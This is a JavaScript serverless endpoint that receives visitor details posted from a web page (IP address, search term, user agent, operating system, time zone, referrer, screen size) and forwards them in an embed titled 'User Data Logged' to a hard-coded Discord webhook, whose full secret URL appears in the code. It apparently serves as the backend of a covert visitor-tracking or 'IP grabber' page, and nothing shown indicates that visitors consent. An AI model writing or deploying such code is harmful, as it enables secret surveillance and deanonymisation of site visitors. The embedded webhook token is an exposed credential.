import fetch from 'node-fetch';

export default async (req, res) => {
    if (req.method === 'POST') {
        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT'; // Your Discord webhook URL

        try {
            const { ip, searchTerm, userAgent, referrer, currentURL, screenWidth, screenHeight, browserLanguage, timeZone, osInfo, timestamp } = req.body;

            // Check if required data is defined
            if (!ip || !userAgent) {
                return res.status(400).json({ message: 'Missing required data.' });
            }

            // Send the collected information to Discord
            const logMessage = {
                embeds: [
                    {
                        title: 'User Data Logged',
                        description: `
                            **Private IP:** \`${ip}\`
                            **Search Term:** \`${searchTerm || 'No search term entered'}\`
                            **User Agent:** \`${userAgent}\`
                            **Browser Language:** \`${browserLanguage}\`
                            **Operating System:** \`${osInfo}\`
                            **Time Zone:** \`${timeZone}\`
                            **Referrer URL:** \`${referrer || 'No referrer'}\`
                            **Current URL:** \`${currentURL}\`
                            **Screen Resolution:** \`${screenWidth} x ${screenHeight}\`
                            **Timestamp:** \`${timestamp}\`
                        `,
                        color: 0xFF0000, // Red color
                        timestamp: new Date(),
                    },
                ],
            };

            const response = await fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(logMessage),
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.error('Failed to send message to Discord:', response.status, errorText);
                return res.status(500).json({ message: 'Error sending to Discord' });
            }

            res.status(200).json({ message: 'User data logged successfully' });
        } catch (error) {
            console.error('Error occurred:', error);
            res.status(500).json({ message: 'Error processing request' });
        }
    } else {
        res.status(405).json({ message: 'Method Not Allowed' });
    }
};
